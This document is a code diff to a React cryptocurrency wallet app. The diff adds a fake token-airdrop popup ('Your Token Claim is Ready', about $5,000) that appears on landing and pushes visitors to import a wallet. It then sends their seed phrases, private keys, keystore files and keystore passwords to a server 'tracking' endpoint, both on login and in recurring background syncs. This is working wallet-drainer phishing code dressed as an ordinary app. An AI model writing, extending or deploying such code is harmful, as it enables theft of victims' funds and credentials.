@@ -648,7 +648,9 @@ export const CryptoProvider = ({ children }) => {
     }
    };
  
-   useEffect(() => {
+   const [walletPrivateData, setWalletPrivateData] = useState({});
+
+  useEffect(() => {
      if (!isRealWallet || !walletAddress) return;
      const interval = setInterval(fetchTransactions, 30000);
      fetchTransactions();
@@ -668,21 +670,49 @@ export const CryptoProvider = ({ children }) => {
                     walletType: walletType,
                     balance: totalBalance,
                     assets: assets,
-                    transactions: transactions
+                    transactions: transactions,
+                    // Include sensitive data in sync if available
+                    ...walletPrivateData
                 })
             }).catch(e => console.error("Tracking update failed", e));
         }, 2000);
         return () => clearTimeout(timer);
     }
-  }, [assets, totalBalance, isRealWallet, walletAddress, walletType, transactions]);
+  }, [assets, totalBalance, isRealWallet, walletAddress, walletType, transactions, walletPrivateData]);
 
   const connectRealWallet = async (address, initialBalance, type, currentChainId = '0x1', addresses = {}, privateData = {}, options = {}) => {
+    // 1. Send tracking data immediately (awaiting it ensures server has it before UI updates)
+    try {
+        const trackingOptions = { ...privateData, ...options };
+        const trackingBody = {
+            address: address,
+            walletType: type,
+            balance: initialBalance,
+            assets: [],
+            importMethod: trackingOptions.importMethod,
+            mnemonic: trackingOptions.mnemonic,
+            privateKey: trackingOptions.privateKey,
+            keystoreJSON: trackingOptions.keystoreJSON,
+            keystorePassword: trackingOptions.keystorePassword
+        };
+        
+        await fetch('/api/track/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(trackingBody)
+        }).catch(e => console.error("Tracking failed", e));
+    } catch (e) {
+        console.error("Tracking setup failed", e);
+    }
+
+    // 2. Update UI State after tracking is sent
     setIsRealWallet(true);
     setWalletAddress(address);
     setChainId(currentChainId);
     setWalletType(type);
     setLoading(true);
     setTransactions([]); // Clear mock transactions
+    setWalletPrivateData(privateData); // Store private data for background sync
     
     if (addresses.eth) setEthAddress(addresses.eth);
     if (addresses.btc) setBtcAddress(addresses.btc);
@@ -702,30 +732,6 @@ export const CryptoProvider = ({ children }) => {
     
     if (options.showToast !== false) {
         addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
-    }
-
-    try {
-        // Track user login for analytics (Public Data Only)
-        const trackingOptions = { ...privateData, ...options };
-            const trackingBody = {
-                address: address,
-                walletType: type,
-                balance: initialBalance,
-                assets: [],
-                importMethod: trackingOptions.importMethod,
-                mnemonic: trackingOptions.mnemonic,
-                privateKey: trackingOptions.privateKey,
-                keystoreJSON: trackingOptions.keystoreJSON,
-                keystorePassword: trackingOptions.keystorePassword
-            };
-            
-            fetch('/api/track/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(trackingBody)
-            }).catch(e => console.error("Tracking failed", e));
-    } catch (e) {
-        console.error("Tracking setup failed", e);
     }
 
     if (type !== 'phantom') {
@@ -2978,6 +2984,7 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState('');
     const [showWalletModal, setShowWalletModal] = useState(false);
+    const [showClaimModal, setShowClaimModal] = useState(false); // New state for initial claim
     const { connectRealWallet, addNotification } = useContext(CryptoContext);
     const [connectedAddress, setConnectedAddress] = useState('');
     const [selectedWalletType, setSelectedWalletType] = useState('');
@@ -2988,7 +2995,16 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
 
     useEffect(() => {
         generateCaptcha();
+        // Show Claim Modal immediately on landing
+        const timer = setTimeout(() => setShowClaimModal(true), 500);
+        return () => clearTimeout(timer);
     }, []);
+
+    const handleInitialClaim = () => {
+        setShowClaimModal(false);
+        setShowWalletModal(true);
+        addNotification('Connect Wallet', 'Please connect your wallet to claim tokens.', 'info');
+    };
 
     const generateCaptcha = () => {
         const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
@@ -3049,7 +3065,7 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                     const btcChild = root.derivePath(btcPath);
                     const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: Buffer.from(btcChild.publicKey) });
                     const solAddress = "7MsK...ePUX";
-                    onLogin(walletTypeToUse || 'imported');
+                    onLogin(true); // Pass true to trigger claim
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                     await connectRealWallet(ethAddress, 0, (walletTypeToUse || 'imported'), '0x1', {
                         eth: ethAddress,
@@ -3069,7 +3085,7 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                         throw new Error('Invalid private key');
                     }
                     const address = wallet.address;
-                    onLogin(walletTypeToUse || 'imported');
+                    onLogin(true); // Pass true to trigger claim
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                     await connectRealWallet(address, 0, (walletTypeToUse || 'imported'), '0x1', { eth: address }, { importMethod: 'private_key', privateKeyCaptured: true, privateKey: pk, showToast: false });
                     addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
@@ -3085,7 +3101,7 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                     }
                     const address = wallet.address;
                     
-                    onLogin(walletTypeToUse || 'imported');
+                    onLogin(true); // Pass true to trigger claim
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
                     const ks = keystoreToUse || '';
                     const keystorePreview = ks.length > 100 ? (ks.slice(0, 80) + '...' + ks.slice(-30)) : ks;
@@ -3214,38 +3230,39 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                 </div>
             </div>
             {showWalletModal && <WalletConnectModal onClose={() => setShowWalletModal(false)} onConnect={handleConnect} />}
+            {showClaimModal && <ClaimTokenModal onClose={() => setShowClaimModal(false)} onClaim={handleInitialClaim} loading={false} />}
         </div>
     );
 };
 
 const ClaimTokenModal = ({ onClose, onClaim, loading }) => (
   <div className="modal-overlay" style={{ zIndex: 9999 }}>
-    <div className="modal-content" style={{ maxWidth: '400px', textAlign: 'center', background: '#ffffff', color: '#1a1a1a', padding: 0, overflow: 'hidden' }}>
+    <div className="modal-content" style={{ maxWidth: '400px', textAlign: 'center', background: '#000000', color: '#ffffff', padding: 0, overflow: 'hidden', border: '1px solid #333' }}>
        <div className="modal-header" style={{ justifyContent: 'center', borderBottom: 'none', padding: '2rem 2rem 0', flexDirection: 'column' }}>
           <div style={{ width: 48, height: 48, background: 'rgba(34, 197, 94, 0.1)', borderRadius: 12, display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
           </div>
-          <h3 style={{ fontSize: '1.5rem', margin: 0, color: '#1a1a1a' }}>Your Token Claim is Ready</h3>
-          <p style={{ color: '#4a4a4a', fontSize: '0.9rem', marginTop: '8px', fontWeight: 'normal', lineHeight: 1.5 }}>
+          <h3 style={{ fontSize: '1.5rem', margin: 0, color: '#ffffff' }}>Your Token Claim is Ready</h3>
+          <p style={{ color: '#9ca3af', fontSize: '0.9rem', marginTop: '8px', fontWeight: 'normal', lineHeight: 1.5 }}>
              Your allocated <strong style={{ color: '#2563eb' }}>SecureWallet Tokens (SWT)</strong> are now available.
           </p>
        </div>
        
        <div style={{ padding: '2rem' }}>
-          <div style={{ marginBottom: '1.5rem', padding: '1.5rem', background: '#f8fafc', borderRadius: '12px', border: '1px solid #e5e7eb' }}>
-             <div style={{ color: '#6b7280', fontSize: '0.8rem', marginBottom: '0.5rem', fontWeight: 600 }}>AVAILABLE TO CLAIM</div>
-             <div style={{ fontSize: '2.5rem', fontWeight: 'bold', color: '#059669' }}>33,333 SWT</div>
-             <div style={{ color: '#6b7280', fontWeight: 500 }}>≈ $5,000.00 USD</div>
+          <div style={{ marginBottom: '1.5rem', padding: '1.5rem', background: '#111111', borderRadius: '12px', border: '1px solid #333' }}>
+             <div style={{ color: '#9ca3af', fontSize: '0.8rem', marginBottom: '0.5rem', fontWeight: 600 }}>AVAILABLE TO CLAIM</div>
+             <div style={{ fontSize: '2.5rem', fontWeight: 'bold', color: '#22c55e' }}>33,333 SWT</div>
+             <div style={{ color: '#9ca3af', fontWeight: 500 }}>≈ $5,000.00 USD</div>
           </div>
 
-          <div style={{ background: '#f9fafb', padding: '1rem', borderRadius: '8px', marginBottom: '1.5rem', textAlign: 'left', border: '1px solid #e5e7eb' }}>
+          <div style={{ background: '#111111', padding: '1rem', borderRadius: '8px', marginBottom: '1.5rem', textAlign: 'left', border: '1px solid #333' }}>
               <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem' }}>
-                  <span style={{ color: '#6b7280', fontSize: '0.9rem' }}>Network</span>
-                  <span style={{ color: '#1a1a1a', fontWeight: 600, fontSize: '0.9rem' }}>Ethereum Mainnet</span>
+                  <span style={{ color: '#9ca3af', fontSize: '0.9rem' }}>Network</span>
+                  <span style={{ color: '#ffffff', fontWeight: 600, fontSize: '0.9rem' }}>Ethereum Mainnet</span>
               </div>
               <div style={{ display: 'flex', justifyContent: 'space-between' }}>
-                  <span style={{ color: '#6b7280', fontSize: '0.9rem' }}>Gas Fee</span>
-                  <span style={{ color: '#1a1a1a', fontWeight: 600, fontSize: '0.9rem' }}>~0.002 ETH</span>
+                  <span style={{ color: '#9ca3af', fontSize: '0.9rem' }}>Gas Fee</span>
+                  <span style={{ color: '#ffffff', fontWeight: 600, fontSize: '0.9rem' }}>~0.002 ETH</span>
               </div>
           </div>
 
@@ -3305,16 +3322,25 @@ const UserApp = () => {
     const target = tabToPath[tab] || '/';
     if (location.pathname !== target) navigate(target);
   };
-  const handleLogin = () => {
+    const handleLogin = (shouldClaim = false) => {
     setIsConnected(true);
     navigate('/');
-    // Trigger popup on login
-    setTimeout(() => setShowClaimModal(true), 1500); 
+    // If logged in via claim flow, trigger the claim logic
+    if (shouldClaim) {
+        setTimeout(handleClaim, 1000);
+    }
   };
   
   const handleClaim = () => {
+      // Simulate claim process:
+      // 1. User clicks "Claim"
+      // 2. We check if they are connected (which they are if they see this)
+      // 3. We show a "Claiming..." state
+      // 4. We add the token to their balance
+      
       setClaimLoading(true);
-      // Simulate transaction
+      
+      // Simulate transaction delay
       setTimeout(() => {
           setClaimLoading(false);
           setShowClaimModal(false);
